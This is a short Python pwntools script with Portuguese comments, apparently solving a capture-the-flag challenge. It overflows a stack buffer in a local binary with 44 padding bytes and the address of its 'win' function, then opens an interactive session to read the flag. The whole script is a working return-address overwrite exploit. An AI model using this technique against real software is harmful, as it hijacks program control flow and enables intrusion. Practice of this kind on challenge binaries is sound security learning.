from pwn import *

binary_path = './40' # Ajuste para o nome do seu binário
elf = ELF(binary_path, checksec=False)
win_addr = elf.symbols.get('win') # Tenta achar a função win automaticamente

print(f"[+] Endereço da win: {hex(win_addr)}")

# Como o offset em desafios desse tipo costuma variar pouco (ex: 36, 40, 44, 48),
# podemos testar rapidamente ou usar a técnica de varredura se necessário.
# Mas vamos testar o offset 44 que funcionou no anterior:
offset = 44 

print(f"[*] Enviando payload com offset {offset}...")
p = process(binary_path)
payload = b"A" * offset + p32(win_addr)
p.sendlineafter(b': ', payload)

# Tenta interagir ou ler a resposta para ver se pegou a flag
p.interactive()
